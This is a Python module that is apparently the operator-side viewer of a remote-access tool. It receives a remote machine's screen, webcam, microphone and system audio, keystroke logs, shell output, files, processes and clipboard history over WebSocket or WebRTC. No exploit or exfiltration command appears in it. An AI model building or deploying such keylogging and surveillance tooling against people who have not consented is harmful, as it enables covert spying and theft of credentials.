import sys
import os
import asyncio
import websockets
import threading
import json
from PyQt6.QtCore import QObject, pyqtSignal
import struct

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core import protocol
from core.network import send_msg, recv_msg

# WebRTC support (optional) - Lazy loaded
AIORTC_AVAILABLE = True # Will be checked on import


class AsyncSessionWorker(QObject):
    frame_received = pyqtSignal(bytes)
    cam_received = pyqtSignal(bytes)
    audio_received = pyqtSignal(bytes)
    sys_audio_received = pyqtSignal(bytes)
    log_received = pyqtSignal(str)
    connection_lost = pyqtSignal()
    connection_progress = pyqtSignal(int, str)  # step (0-3), hint message
    connection_ready = pyqtSignal()  # emitted when handshake complete
    device_error = pyqtSignal(str, str)  # device type (CAM/MIC), error message
    
    # New tab signals
    shell_output = pyqtSignal(str)
    shell_exit = pyqtSignal(int)
    shell_cwd = pyqtSignal(str) # New Signal for CWD
    pm_data = pyqtSignal(list)  # Process list

    fm_data = pyqtSignal(list, str)  # Files, path
    fm_chunk = pyqtSignal(bytes)  # File download chunk
    clipboard_data = pyqtSignal(str)
    clipboard_history = pyqtSignal(list)  # Clipboard history list
    clipboard_entry = pyqtSignal(dict)  # New real-time clipboard entry
    sysinfo_data = pyqtSignal(dict)
    
    # WebRTC signals (Project Supersonic)
    webrtc_frame_received = pyqtSignal(object)  # numpy array from WebRTC video track

    def __init__(self, target_url, target_id=None):
        super().__init__()
        self.target_url = target_url
        self.target_id = target_id
        self.running = True
        self.loop = None
        self.ws = None
        self._lock = threading.Lock()
        
        # WebRTC client (Project Supersonic)
        self.webrtc_client = None
        self.use_webrtc = AIORTC_AVAILABLE  # Auto-enable if available

    def is_connected(self):
        """Thread-safe connection check"""
        with self._lock:
            return self.ws is not None and self.running

    def start_async(self):
        """Starts the Asyncio Loop in a separate Thread"""
        t = threading.Thread(target=self._run_loop)
        t.daemon = True
        t.start()

    def stop(self):
        """Graceful shutdown"""
        self.running = False
        with self._lock:
            # Close WebRTC connection
            if self.webrtc_client and self.loop and self.loop.is_running():
                asyncio.run_coroutine_threadsafe(self.webrtc_client.close(), self.loop)
                self.webrtc_client = None
            
            if self.ws:
                # Schedule close if loop exists
                if self.loop and self.loop.is_running():
                    asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
                self.ws = None

    def send_msg(self, data: bytes):
        """Send a message to the agent from UI thread."""
        with self._lock:
            if self.ws and self.loop and self.loop.is_running():
                asyncio.run_coroutine_threadsafe(
                    send_msg(self.ws, data),
                    self.loop
                )

    def _run_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._connect_and_stream())
        except Exception as e:
            print(f"[-] Worker Loop Error: {e}")
        finally:
            try:
                self.loop.run_until_complete(self.loop.shutdown_asyncgens())
            except Exception:
                pass
            self.loop.close()
            asyncio.set_event_loop(None)

    async def _connect_and_stream(self):
        try:
            # FIX: Downgrade WSS to WS for localhost to avoid handshake errors
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(self.target_url)
            if parsed.hostname in ("localhost", "127.0.0.1", "::1"):
                if parsed.scheme == "wss":
                    # Rebuild with ws scheme
                    self.target_url = urlunparse(parsed._replace(scheme="ws"))
                    print(f"[*] Downgraded to ws:// for localhost: {self.target_url}")

            # Step 0: Connecting to broker
            self.connection_progress.emit(0, "Establishing WebSocket connection...")
            print(f"[*] Viewer connecting to {self.target_url}")
            async with websockets.connect(self.target_url) as ws:
                with self._lock:
                    self.ws = ws
                
                # Direct Connection (Cloudflare or Local)
                # We removed Broker Lookup logic as per user request.
                # Always assume Direct Mode.
                self.connection_progress.emit(1, "Direct Handshake...")
                    
                # Step 2: Application Level Handshake
                self.connection_progress.emit(2, "Handshaking...")
                
                # Send Hello (JSON)
                # Note: Old agents expect legacy bytes? New agent uses JSON.
                # Let's try sending JSON 'hello' which is supported by new Agent's handle_message
                hello_msg = {
                    "op": "hello",
                    "type": "viewer"
                }
                # Send as TEXT frame (no encode) so Agent doesn't ignore it (it ignores bytes)
                await send_msg(ws, json.dumps(hello_msg))
                
                # Wait for Hello Reply
                reply = await recv_msg(ws)
                if reply:
                    try:
                        data = json.loads(reply)
                        if data.get('op') == 'hello':
                            print(f"[+] Connected to Agent: {data.get('id')}")
                            # Handshake Complete!
                            self.connection_ready.emit()
                            
                            # Try WebRTC first (Project Supersonic)
                            if self.use_webrtc and AIORTC_AVAILABLE:
                                await self._start_webrtc(ws)
                            else:
                                # Fallback to old WebSocket streaming
                                await send_msg(ws, json.dumps({"op": "start_stream"}))
                            
                            # Enter message loop
                            await self._read_loop(ws)
                            return
                    except Exception:
                        pass
                        
                # Fallback for legacy (if any) or failed handshake
                print("[-] Handshake Failed")
                self.connection_lost.emit()

        except Exception as e:
            print(f"Session Error: {e}")
        finally:
            with self._lock:
                self.ws = None
            self.connection_lost.emit()

    # ================================================================
    # WebRTC Methods (Project Supersonic)
    # ================================================================
    async def _start_webrtc(self, ws):
        """Initialize WebRTC connection with Agent"""
        try:
            # Lazy import to avoid startup lag
            try:
                from viewer.webrtc_client import WebRTCClient, AIORTC_AVAILABLE
                if not AIORTC_AVAILABLE:
                    raise ImportError("aiortc not installed")
            except ImportError:
                print("[-] WebRTC not available (aiortc not installed)")
                self.use_webrtc = False
                await send_msg(ws, json.dumps({"op": "start_stream"}))
                return

            print("[*] Starting WebRTC connection...")
            
            # Create WebRTC client with message sender
            async def send_ws_message(opcode: int, payload: bytes):
                await send_msg(ws, bytes([opcode]) + payload)
            
            self.webrtc_client = WebRTCClient(send_ws_message)
            
            # Connect video frame signal
            if hasattr(self.webrtc_client, 'video_frame_received'):
                self.webrtc_client.video_frame_received.connect(self._on_webrtc_frame)
            
            # Start WebRTC negotiation (sends OP_RTC_OFFER)
            await self.webrtc_client.start_connection()
            print("[+] WebRTC offer sent, waiting for answer...")
            
        except Exception as e:
            print(f"[-] WebRTC initialization failed: {e}, falling back to WebSocket")
            self.webrtc_client = None
            # Fallback to old streaming
            await send_msg(ws, json.dumps({"op": "start_stream"}))
    
    def _on_webrtc_frame(self, frame):
        """Handle incoming WebRTC video frame (numpy array)"""
        try:
            # Emit to UI (same signal path as old frames)
            self.webrtc_frame_received.emit(frame)
        except Exception as e:
            print(f"[-] WebRTC frame error: {e}")

    # Alias for compatibility with new handshake logic
    async def _read_loop(self, ws):
        await self._stream_loop(ws)

    async def _stream_loop(self, ws):
        while self.running:
            msg = await recv_msg(ws)
            if not msg:
                break
            
            opcode = msg[0]
            payload = msg[1:]
            
            if opcode == protocol.OP_IMG_FRAME:
                self.frame_received.emit(payload)
            elif opcode == protocol.OP_CAM_FRAME:
                self.cam_received.emit(payload)
            elif opcode == protocol.OP_AUDIO_CHUNK:
                self.audio_received.emit(payload)
            elif opcode == protocol.OP_SYS_AUDIO_CHUNK:
                self.sys_audio_received.emit(payload)
            elif opcode == protocol.OP_KEY_LOG:
                try:
                    decoded = payload.decode('utf-8')
                    # print(f"[DEBUG] Viewer Recv Keylog: {repr(decoded)}")
                    self.log_received.emit(decoded)
                except UnicodeDecodeError:
                    pass
            
            # Shell responses
            elif opcode == protocol.OP_SHELL_OUTPUT:
                try:
                    text = payload.decode('utf-8')
                    self.shell_output.emit(text)
                except UnicodeDecodeError:
                    pass
            elif opcode == protocol.OP_SHELL_EXIT:
                if len(payload) >= 4:
                    try:
                        code = struct.unpack('<i', payload[:4])[0]
                        self.shell_exit.emit(code)
                    except struct.error:
                        pass
            elif opcode == protocol.OP_SHELL_CWD:
                try:
                    self.shell_cwd.emit(payload.decode('utf-8'))
                except UnicodeDecodeError:
                    pass
            
            # Process Manager responses
            elif opcode == protocol.OP_PM_DATA:
                try:
                    data = json.loads(payload.decode('utf-8'))
                    self.pm_data.emit(data)
                except Exception as e:
                    print(f"[!] Error parsing PM data: {e}")
            
            # File Manager responses
            elif opcode == protocol.OP_FM_DATA:
                try:
                    data = json.loads(payload.decode('utf-8'))
                    files = data.get('files', [])
                    path = data.get('path', '')
                    self.fm_data.emit(files, path)
                except Exception as e:
                    print(f"[!] Error parsing FM data: {e}")
            elif opcode == protocol.OP_FM_CHUNK:
                self.fm_chunk.emit(payload)
            
            # Clipboard responses
            elif opcode == protocol.OP_CLIP_DATA:
                try:
                    self.clipboard_data.emit(payload.decode('utf-8'))
                except UnicodeDecodeError:
                    pass
            
            elif opcode == protocol.OP_CLIP_HISTORY_DATA:
                try:
                    data = json.loads(payload.decode('utf-8'))
                    self.clipboard_history.emit(data)
                except Exception as e:
                    print(f"[!] Error parsing clipboard history data: {e}")
            
            elif opcode == protocol.OP_CLIP_ENTRY:
                try:
                    data = json.loads(payload.decode('utf-8'))
                    self.clipboard_entry.emit(data)
                except Exception as e:
                    print(f"[!] Error parsing clipboard entry data: {e}")
            
            # Settings responses
            elif opcode == protocol.OP_SYSINFO_DATA:
                try:
                    data = json.loads(payload.decode('utf-8'))
                    self.sysinfo_data.emit(data)
                except Exception as e:
                    print(f"[!] Error parsing sysinfo data: {e}")
            
            # ================================================================
            # WebRTC Signaling (Project Supersonic)
            # ================================================================
            elif opcode == protocol.OP_RTC_ANSWER:
                if self.webrtc_client:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        asyncio.create_task(self.webrtc_client.handle_answer(
                            data.get('sdp'), data.get('type', 'answer')
                        ))
                    except Exception as e:
                        print(f"[!] WebRTC answer error: {e}")
            
            elif opcode == protocol.OP_ICE_CANDIDATE:
                if self.webrtc_client:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        asyncio.create_task(self.webrtc_client.handle_ice_candidate(data))
                    except Exception as e:
                        print(f"[!] WebRTC ICE candidate error: {e}")
            
            elif opcode == protocol.OP_ERROR:
                try:
                    error_msg = payload.decode('utf-8')
                except Exception as e:
                    print(f"[!] Error parsing error message: {e}")
                    error_msg = "Unknown"
                
                # Check for device-specific errors (don't disconnect)
                if error_msg.startswith("CAM:"):
                    self.device_error.emit("CAM", error_msg[4:])
                elif error_msg.startswith("MIC:"):
                    self.device_error.emit("MIC", error_msg[4:])
                else:
                    # Generic error - disconnect
                    print(f"[-] Server Error: {error_msg}")
                    break
            elif opcode == protocol.OP_DISCONNECT:
                print("[!] Server requested disconnect.")
                break
# alr 
